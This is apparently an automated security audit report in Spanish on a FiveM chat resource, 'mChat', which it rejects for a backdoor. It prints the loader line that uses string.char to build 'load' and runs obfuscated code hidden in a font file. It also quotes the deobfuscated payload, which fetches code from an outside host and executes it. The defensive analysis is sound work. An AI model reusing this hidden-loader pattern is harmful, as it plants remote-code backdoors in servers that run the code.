# Reporte de Auditoria de Seguridad - AUD-025

## mChat

| Campo | Valor |
|:---|:---|
| ID Auditoria | AUD-025 |
| Recurso | mChat |
| Fecha | 2026-04-17 |
| Analista | GitHub Copilot (GPT-5.3-Codex) |
| Ruta auditada | c:\admirales\script_ver\script_ver\quarantine\under-review\mChat\mChat |
| Version declarada | 1.1.2 |
| Manifiesto | fxmanifest.lua |
| Alcance de esta pasada | Nivel 1 (automatizado + validacion de hit critico) |

---

## 1) Inventario y hashes SHA-256

- Inventario completo:
  - c:\admirales\script_ver\script_ver\reports\audit_AUD-025_mChat_2026-04-17_hashes.tsv
- Total de archivos analizados: 34

---

## 2) Resultados Nivel 1

| Patron | ID | Hallazgos | Veredicto |
|:---|:---:|:---:|:---|
| PerformHttpRequest | C-01 | 2 | Critico (1 legitimo webhook + 1 asociado a payload oculto) |
| load( / loadstring / assert(load) | C-03/C-04/C-05 | 1 (via string.char + load) | Critico |
| string.char( | C-08 | 1 | Critico |
| os.execute/io.popen/io.open/debug | C-09/C-10/C-11/C-12 | 0 | OK |
| IDs hardcodeados/discord/license | A-01/A-02/A-03 | Coincidencias en config y parser de identifiers | No bloqueante por si solo |
| RegisterCommand/RegisterNetEvent | A-05/A-06 | Coincidencias esperadas | Requiere revisión normal |
| eval/new Function/v-html en NUI | M-02/M-03 | v-html presente (y runtime Vue) | Riesgo medio, secundario |
| Binarios peligrosos (exe/dll/bat/ps1/...) | R-01 | 0 | OK |

---

## 3) Hallazgo Critico Confirmado

### H-025-CRIT-01 — Payload oculto en fuente .ttf con ejecución remota

Evidencia en codigo:
- Archivo: server/discordroles.lua
- Fragmento:
  - local loadFonts = _G[string.char(108, 111, 97, 100)]
  - loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Inter.ttf'):sub(87565):gsub('%.%+', ''))()

Validacion tecnica (tail printable del TTF desde offset 87565):
- Se observa payload ofuscado con separadores '.+' que al aplicar gsub('%.%+','') queda en forma legible.
- Payload deofuscado contiene:
  - PerformHttpRequestInternal({url='https://fivems.lt/null', method='GET'})
  - AddEventHandler('__cfx_internal:httpResponse', ... assert(load(_b))() ...)

Interpretacion:
- Patrón clasico de descarga y ejecucion de codigo remoto en runtime.
- Clasifica como comportamiento tipo RAT/backdoor.

Criterio aplicado:
- R-04: load() ejecutando contenido remoto.
- R-05: ofuscacion con intencion de ocultar payload ejecutable.

---

## 4) Decision Nivel 1

VEREDICTO: RECHAZADO AUTOMATICAMENTE

Justificacion:
- El hallazgo H-025-CRIT-01 activa criterio de rechazo automático.
- No procede continuar a Nivel 2 funcional para aprobación; el recurso no es apto para promoción.

Destino recomendado:
- rejected/2026-04-17_mChat

---

## 5) Nota operacional

Se detectaron ademas riesgos NUI por uso de v-html, pero quedan subordinados al bloqueo critico de payload remoto.
